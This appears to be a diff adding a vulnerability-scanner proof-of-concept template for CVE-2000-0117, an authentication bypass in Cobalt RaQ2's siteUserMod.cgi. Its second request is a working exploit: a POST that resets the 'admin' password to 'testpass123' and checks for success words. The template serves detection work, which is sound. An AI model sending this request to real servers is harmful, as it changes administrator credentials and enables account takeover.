@@ -1,0 +1,66 @@
+[info]
+author = "ave"
+description = "检测 Cobalt RaQ2 siteUserMod.cgi 认证绕过漏洞，验证站点管理员是否可越权修改其他用户（含 admin/root）密码"
+id = "POC-AVE-2000-0102"
+name = "CVE-2000-0117 PoC"
+severity = "high"
+tags = ["ave-2000-0102"]
+vuln_id = [
+    "CVE-2000-0117",
+    "AVE-2000-0102",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/.cobalt/siteUserMod/siteUserMod.cgi"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "siteUserMod",
+    "password",
+    "user",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/.cobalt/siteUserMod/siteUserMod.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "user=admin&newpass=testpass123&confirm=testpass123&submit=Modify"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "password",
+    "changed",
+    "modified",
+    "success",
+    "updated",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    302,
+]
+type = "status"
